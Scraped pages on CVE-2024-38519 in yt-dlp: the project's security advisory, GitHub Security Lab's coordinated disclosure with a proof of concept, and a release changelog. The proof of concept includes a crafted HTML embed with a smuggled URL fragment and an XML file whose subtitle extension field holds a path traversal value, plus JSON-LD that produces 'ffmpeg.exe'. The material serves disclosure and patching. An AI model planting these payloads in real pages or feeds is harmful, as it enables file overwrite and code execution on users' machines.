* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_6e78095d_20250111_204604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Fsecurity%2Fadvisories%2FGHSA-79w7-vh3h-8g4j)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Fsecurity%2Fadvisories%2FGHSA-79w7-vh3h-8g4j)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=yt-dlp%2Fyt-dlp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yt-dlp](/yt-dlp)
/
**[yt-dlp](/yt-dlp/yt-dlp)**
Public

* [Notifications](/login?return_to=%2Fyt-dlp%2Fyt-dlp) You must be signed in to change notification settings
* [Fork
  7.5k](/login?return_to=%2Fyt-dlp%2Fyt-dlp)
* [Star
   96k](/login?return_to=%2Fyt-dlp%2Fyt-dlp)

* [Code](/yt-dlp/yt-dlp)
* [Issues
  1.5k](/yt-dlp/yt-dlp/issues)
* [Pull requests
  323](/yt-dlp/yt-dlp/pulls)
* [Discussions](/yt-dlp/yt-dlp/discussions)
* [Actions](/yt-dlp/yt-dlp/actions)
* [Projects
  4](/yt-dlp/yt-dlp/projects)
* [Wiki](/yt-dlp/yt-dlp/wiki)
* [Security](/yt-dlp/yt-dlp/security)
* [Insights](/yt-dlp/yt-dlp/pulse)

Additional navigation options

* [Code](/yt-dlp/yt-dlp)
* [Issues](/yt-dlp/yt-dlp/issues)
* [Pull requests](/yt-dlp/yt-dlp/pulls)
* [Discussions](/yt-dlp/yt-dlp/discussions)
* [Actions](/yt-dlp/yt-dlp/actions)
* [Projects](/yt-dlp/yt-dlp/projects)
* [Wiki](/yt-dlp/yt-dlp/wiki)
* [Security](/yt-dlp/yt-dlp/security)
* [Insights](/yt-dlp/yt-dlp/pulse)

# File system modification and RCE through improper file-extension sanitization

High

[bashonly](/bashonly)
published
GHSA-79w7-vh3h-8g4j
Jul 1, 2024

## Package

pip

yt-dlp
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<2024.07.01

## Patched versions

2024.07.01

## Description

### Summary

`yt-dlp` does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). Since `yt-dlp` also reads config from the working directory (and on Windows executables will be executed from the yt-dlp directory) this could lead to arbitrary code being executed.

### Patches

`yt-dlp` version 2024.07.01 fixes this issue by whitelisting the allowed extensions.

This means some very uncommon extensions might not get downloaded; however, it will also limit the possible exploitation surface.

### Workarounds

It is recommended to upgrade yt-dlp to version 2024.07.01 as soon as possible, **always** have `.%(ext)s` at the end of the output template, and make sure you trust the websites that you are downloading from. Also, make sure to never download to a directory within PATH or other sensitive locations like your user directory, `system32`, or other binaries locations.

For users not able to upgrade:

* Make sure the extension of the media to download is a common video/audio/sub/... one
* Try to avoid the generic extractor (`--ies default,-generic`)
* Keep the default output template (`-o "%(title)s [%(id)s].%(ext)s`)
* Omit any of the subtitle options (`--write-subs`, `--write-auto-subs`, `--all-subs`, `--write-srt`)
* Use `--ignore-config --config-location ...` to not load config from common locations

### Details

One potential exploitation might look like this:

From a mimetype we do not know, we default to trimming the leading bit and using the remainder. Given a webpage that contains

```
<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "VideoObject",
    "name": "ffmpeg",
    "encodingFormat": "video/exe",
    "contentUrl": "https://example.com/video.mp4"
}
</script>
```

this will try and download a file called `ffmpeg.exe` (`-o "%(title)s.%(ext)s`).

`ffmpeg.exe` will be searched for in the current directory, and so upon the next run arbitrary code can be executed.

Alternatively, when engineering a file called `yt-dlp.conf` to be created, the config file could contain `--exec ...` and so would also execute arbitrary code.

### Acknowledgement

A big thanks to [@JarLob](https://github.com/JarLob) for independently finding a new application of the same underlying issue.

More can be read about on the dedicated GitHub Security Lab disclosure here: [Path traversal saving subtitles (GHSL-2024-090)](https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp)

### References

* [GHSA-79w7-vh3h-8g4j](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j "GHSA-79w7-vh3h-8g4j")
* <https://nvd.nist.gov/vuln/detail/CVE-2024-38519>
* <https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01>
* [5ce5824](https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a)
* <https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp>

### Severity

High

7.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-38519

### Weaknesses

No CWEs

### Credits

* [![@pukkandan](https://avatars.githubusercontent.com/u/6623388?s=40&v=4)](/pukkandan)
  [pukkandan](/pukkandan)
  Finder
* [![@JarLob](https://avatars.githubusercontent.com/u/26652396?s=40&v=4)](/JarLob)
  [JarLob](/JarLob)
  Reporter
* [![@Grub4K](https://avatars.githubusercontent.com/u/37424085?s=40&v=4)](/Grub4K)
  [Grub4K](/Grub4K)
  Remediation developer

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from securitylab.github.com_8d8d48c0_20250111_204607.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 1, 2024
# GHSL-2024-090: Path traversal in yt-dlp leading to RCE - CVE-2024-38519

[![Author avatar](https://avatars.githubusercontent.com/u/26652396)
Jaroslav Lobaƒçevski](https://github.com/jarlob)

## Coordinated Disclosure Timeline

* 2024-05-24: A [private vulnerability reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability) was used to send the report to maintainers.
* 2024-05-24: The report was accepted.
* 2024-07-01: [v2024.07.01](https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01) with the fix was released.
* 2024-07-01: The advisory was published.

## Summary

`yt-dlp` doesn‚Äôt validate the subtitle extension name, which makes its Windows users vulnerable to path traversal and allows for arbitrary binary file overwrite when downloading a video with subtitles from a crafted link.

## Project

yt-dlp

## Tested Version

[v2024.04.09](https://github.com/yt-dlp/yt-dlp/releases/tag/2024.04.09)

## Details

### Path traversal saving subtitles (`GHSL-2024-090`)

`yt-dlp` is capable of downloading not only video files, but also accompanying subtitles if the user specifies the `--write-subs`, `--write-auto-subs`, `--all-subs` or `--write-srt` option. Each supported video website has a dedicated [extractor](https://github.com/yt-dlp/yt-dlp/tree/master/yt_dlp/extractor). Some extractors provide [only URLs of subtitles](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/extractor/globo.py#L145-L147) and yt-dlp [resolves their extension from the URL path](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/YoutubeDL.py#L2775). Others provide the URLs and the subtitle extensions explicitly. In turn, some of the latter extractors [validate the extracted subtitle extension](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/extractor/anvato.py#L359-L363), but others trust the extracted value [blindly](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/extractor/microsoftvirtualacademy.py#L102-L104). `yt-dlp` honors the provided extension name and uses it to [build the name of the output file for subtitles](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/YoutubeDL.py#L4305) in [1]. The `filename` is the generated name for the video file, `sub_lang` is `en` by default, `sub_format` is the extracted subtitles extension and `info_dict.get('ext')` contains the video file extension to [replace with](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/utils/_utils.py#L2093-L2097) the `sub_format` in [`subtitles_filename`](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/utils/_utils.py#L1258-L1259). The subtitle is written as a binary file in [2]. If the user doesn‚Äôt override the [default output file template `%(title)s [%(id)s].%(ext)s`](https://github.com/yt-dlp/yt-dlp/blob/3779f2a307ba3ef1d28e107cdd71b221dfb4eb36/yt_dlp/utils/_utils.py#L2799), then the `sub_filename` is formatted as `%(title)s [%(id)s].%(sub_lang).%(sub_format)s`. The path traversal injection in `sub_format` doesn‚Äôt work on Linux because Linux doesn‚Äôt accept paths like `not_existing_folder/../../file`. But it does work on Windows.

```
        for sub_lang, sub_info in subtitles.items():
            sub_format = sub_info['ext']
            sub_filename = subtitles_filename(filename, sub_lang, sub_format, info_dict.get('ext')) # <------------- [1]
            sub_filename_final = subtitles_filename(sub_filename_base, sub_lang, sub_format, info_dict.get('ext'))
            existing_sub = self.existing_file((sub_filename_final, sub_filename))
            if existing_sub:
                self.to_screen(f'[info] Video subtitle {sub_lang}.{sub_format} is already present')
                sub_info['filepath'] = existing_sub
                ret.append((existing_sub, sub_filename_final))
                continue

            self.to_screen(f'[info] Writing video subtitles to: {sub_filename}')
#...

            try:
                sub_copy = sub_info.copy()
                sub_copy.setdefault('http_headers', info_dict.get('http_headers'))
                self.dl(sub_filename, sub_copy, subtitle=True) # <------------- [2]
                sub_info['filepath'] = sub_filename
                ret.append((sub_filename, sub_filename_final))
#...

```
#### Exploitability and Proof of Concept (PoC)

Intentionally crafted subtitle extension names in a supported website (such as youtube.com or bbc.co.uk) are not in the threat model of the report. However it is possible that the websites may be compromised at some moment of time. An XSS or SQL injection would allow the attacker to exploit a specific yt-dlp extractor. Then the attacker would need to wait for any yt-dlp user or trick a specific yt-dlp user to download the video with subtitles. However other yt-dlp features allow exploitation without compromising the video hosting website:

1. URL smuggling. Some yt-dlp extractors attempt to get additional information from the URL part that comes after `#` - the fragment. The fragment is URL decoded and parsed as JSON. The extractor for Microsoft Virtual Academy, for example, parses the fragment [1] and retrieves `base_url` from it [2] and then downloads an XML file from that URL [3]. The subtitle extension is extracted from the XML file. If a user is tricked to run, for example, `yt-dlp --write-subs https://mva.microsoft.com/en-US/training-courses/microsoft-azure-fundamentals-virtual-machines-11788?l=gfVXISmEB_6804984382#__youtubedl_smuggle=%7B%22base_url%22%3A+%22http%3A%2F%2Fsite.com%22%7D` it will use an XML file from an attacker controlled site, `site.com` in this case, to extract subtitles and video files.
   ```
        url, smuggled_data = unsmuggle_url(url, {}) <------------- [1]

        mobj = self._match_valid_url(url)
        course_id = mobj.group('course_id')
        video_id = mobj.group('id')

        base_url = smuggled_data.get('base_url') or self._extract_base_url(course_id, video_id) <------------- [2]

        settings = self._download_xml(
            '%s/content/content_%s/videosettings.xml?v=1' % (base_url, video_id), <------------- [3]
            video_id, 'Downloading video settings XML')

   ```
2. Generic extractor. `yt-dlp` allows you to download videos from arbitrary pages that embed supported video websites. This allows the attacker to hide the smuggled fragment from a yt-dlp user. The user needs to run only `yt-dlp --write-subs https://attacker.com/poc.html`

For a PoC:

* Create a folder with the following `poc.html`:

```
<class="embedly-card" href="https://mva.microsoft.com/en-US/training-courses/microsoft-azure-fundamentals-virtual-machines-11788?l=gfVXISmEB_6804984382#__youtubedl_smuggle=%7B%22base_url%22%3A+%22http%3A%2F%2F127.0.0.1%3A8000%22%7D">

```

* Create two subfolders `content/content_gfVXISmEB_6804984382` in the folder where `poc.html` resides.
* Create the following `videosettings.xml` in the `content_gfVXISmEB_6804984382` folder:

```
<videoSettings version="1.5">
  <PlaylistItems>
    <PlaylistItem>
      <MediaSources videoType="progressive">Ôªø<MediaSource videoMode="720p" mimeType="video/mp4" codec="avc1.42E01E,mp4a.40.2" default="true">http://video.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01_high.mp4</MediaSource>Ôªø<MediaSource videoMode="540p" mimeType="video/mp4" codec="avc1.42E01E,mp4a.40.2" default="false">http://video.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01_mid.mp4</MediaSource>Ôªø<MediaSource videoMode="360p" mimeType="video/mp4" codec="avc1.42E01E,mp4a.40.2" default="false">https://sec.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01.mp4</MediaSource></MediaSources>
      <MediaSource />
      <Title>01 | Introduction</Title>
      <MarkerResourceSource type="/../../poc.bin">content/content_gfvxismeb_6804984382/subtitles</MarkerResourceSource>
      <ThumbSource />
    </PlaylistItem>
  </PlaylistItems>
</videoSettings>

```

* Create arbitrary file `subtitles` in the `content_gfVXISmEB_6804984382` folder.
* Host the folder with `poc.html` with `python3 -m http.server`
* On Windows run `yt-dlp --write-subs http://127.0.0.1:8000/poc.html`
* `yt-dlp` creates a file `poc.bin` one level up from the current folder as long as the running user has sufficient permissions.

#### Impact

This issue may lead to unauthorized file system modification and later may lead to remote code execution if an executable file is overwritten.

## CVE

* CVE-2024-38519

## Credit

This issue was discovered and reported by GHSL team member [@JarLob (Jaroslav Lobaƒçevski)](https://github.com/JarLob).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-090` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ¬©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_6954d896_20250111_204604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Freleases%2Ftag%2F2024.07.01)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Freleases%2Ftag%2F2024.07.01)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=yt-dlp%2Fyt-dlp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yt-dlp](/yt-dlp)
/
**[yt-dlp](/yt-dlp/yt-dlp)**
Public

* [Notifications](/login?return_to=%2Fyt-dlp%2Fyt-dlp) You must be signed in to change notification settings
* [Fork
  7.5k](/login?return_to=%2Fyt-dlp%2Fyt-dlp)
* [Star
   96k](/login?return_to=%2Fyt-dlp%2Fyt-dlp)

* [Code](/yt-dlp/yt-dlp/tree/2024.07.01)
* [Issues
  1.5k](/yt-dlp/yt-dlp/issues)
* [Pull requests
  323](/yt-dlp/yt-dlp/pulls)
* [Discussions](/yt-dlp/yt-dlp/discussions)
* [Actions](/yt-dlp/yt-dlp/actions)
* [Projects
  4](/yt-dlp/yt-dlp/projects)
* [Wiki](/yt-dlp/yt-dlp/wiki)
* [Security](/yt-dlp/yt-dlp/security)
* [Insights](/yt-dlp/yt-dlp/pulse)

Additional navigation options

* [Code](/yt-dlp/yt-dlp/tree/2024.07.01)
* [Issues](/yt-dlp/yt-dlp/issues)
* [Pull requests](/yt-dlp/yt-dlp/pulls)
* [Discussions](/yt-dlp/yt-dlp/discussions)
* [Actions](/yt-dlp/yt-dlp/actions)
* [Projects](/yt-dlp/yt-dlp/projects)
* [Wiki](/yt-dlp/yt-dlp/wiki)
* [Security](/yt-dlp/yt-dlp/security)
* [Insights](/yt-dlp/yt-dlp/pulse)

1. [Releases](/yt-dlp/yt-dlp/releases)
2. [2024.07.01](/yt-dlp/yt-dlp/releases/tag/2024.07.01)

# yt-dlp 2024.07.01

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/yt-dlp/yt-dlp/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...2024.07.01)

 Loading

[View all tags](/yt-dlp/yt-dlp/tags)

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)
released this
01 Jul 23:06

[2024.07.01](/yt-dlp/yt-dlp/tree/2024.07.01)

[`cd68258`](/yt-dlp/yt-dlp/commit/cd68258225dc813c74fbda4c4fda0c736d6fda10)

[![Installation](https://camo.githubusercontent.com/a03bddc2b3a93bcb6a5d86ea8f79c570c68779769a12de2364477acae72538bc/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d576869636825323066696c65253230746f253230646f776e6c6f61642533462d77686974652e7376673f7374796c653d666f722d7468652d6261646765)](https://github.com/yt-dlp/yt-dlp#installation "Installation instructions") [![Discord](https://camo.githubusercontent.com/bcdc8bc6e8838a459e598b3746c9adb9c5c0812f8f32e704022f36461ba4eecd/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3830373234353635323037323835373631303f636f6c6f723d626c7565266c6162656c436f6c6f723d353535353535266c6162656c3d266c6f676f3d646973636f7264267374796c653d666f722d7468652d6261646765)](https://discord.gg/H5MNcFW63r "Discord") [![Donate](https://camo.githubusercontent.com/a8b252926d34e6123df43a4f0b9fa19d1fef006ffe4613e79eeff5421acf90e3/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5f2d446f6e6174652d7265642e7376673f6c6f676f3d67697468756273706f6e736f7273266c6162656c436f6c6f723d353535353535267374796c653d666f722d7468652d6261646765)](https://github.com/yt-dlp/yt-dlp/blob/master/Collaborators.md#collaborators "Donate") [![Documentation](https://camo.githubusercontent.com/0d68539d0356a8e3bf8e2dd8f90d25721b77d62be5356760d74530f9c61e1157/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d446f63732d627269676874677265656e2e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d476974426f6f6b266c6162656c436f6c6f723d353535353535)](https://github.com/yt-dlp/yt-dlp/tree/2024.07.01#readme "Documentation") [![Nightly](https://camo.githubusercontent.com/52209411b6ccd5fddc2b96c8e3cb793154ccf12fb3402f48d76e31b63398aea4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4e696768746c792532306275696c64732d707572706c652e7376673f7374796c653d666f722d7468652d6261646765)](https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/latest "Nightly builds") [![Master](https://camo.githubusercontent.com/4a10df286c03ca0454dfcbc70ed6c19ef67d97acbdf57eae71688c76246c1f24/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4d61737465722532306275696c64732d6c69676874626c75652e7376673f7374796c653d666f722d7468652d6261646765)](https://github.com/yt-dlp/yt-dlp-master-builds/releases/latest "Master builds")

#### A description of the various files are in the [README](https://github.com/yt-dlp/yt-dlp#release-files)

---

#### Important changes

* Security: [[CVE-2024-38519](https://nvd.nist.gov/vuln/detail/CVE-2024-38519)] [Properly sanitize file-extension to prevent file system modification and RCE](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j)
  + Unsafe extensions are now blocked from being downloaded

### Changelog

#### Core changes

* [Add `playlist_channel` and `playlist_channel_id` fields](https://github.com/yt-dlp/yt-dlp/commit/55e3e6fd21e741ec5ae3d8624de5e5ea345810eb) ([#10266](https://github.com/yt-dlp/yt-dlp/issues/10266)) by [bashonly](https://github.com/bashonly)
* [Disallow unsafe extensions (CVE-2024-38519)](https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a) by [Grub4K](https://github.com/Grub4K)
* **cookies**: [Fix `--cookies-from-browser` DE detection on Linux](https://github.com/yt-dlp/yt-dlp/commit/a8520244b8642880e4d35925e9e49eff94d548de) ([#10237](https://github.com/yt-dlp/yt-dlp/issues/10237)) by [peisenwang](https://github.com/peisenwang)

#### Extractor changes

* **afreecatv**
  + [Support browser impersonation](https://github.com/yt-dlp/yt-dlp/commit/e8352ad6599de7b5371dc39a1a1edc7890aaedb4) ([#10174](https://github.com/yt-dlp/yt-dlp/issues/10174)) by [hui1601](https://github.com/hui1601)
  + catchstory: [Add extractor](https://github.com/yt-dlp/yt-dlp/commit/054a3ba7d1293f9fbe21800d62d1e5ddcbded238) ([#10235](https://github.com/yt-dlp/yt-dlp/issues/10235)) by [hui1601](https://github.com/hui1601)
* **bilibili**: [Support legacy formats](https://github.com/yt-dlp/yt-dlp/commit/1d6ab17d0752ee9cf19e3e63c7dec7b600d3f228) ([#9117](https://github.com/yt-dlp/yt-dlp/issues/9117)) by [c-basalt](https://github.com/c-basalt), [GD-Slime](https://github.com/GD-Slime)
* **bitchute**: [Fix extractors](https://github.com/yt-dlp/yt-dlp/commit/5b1a2aa978d0074cee278e7659f32f52ecc4ab53) ([#10301](https://github.com/yt-dlp/yt-dlp/issues/10301)) by [seproDev](https://github.com/seproDev)
* **brightcove**: [Upgrade requests to HTTPS](https://github.com/yt-dlp/yt-dlp/commit/90c3721a322756bb7f4ca10ceb73744500bee37e) ([#10202](https://github.com/yt-dlp/yt-dlp/issues/10202)) by [bashonly](https://github.com/bashonly)
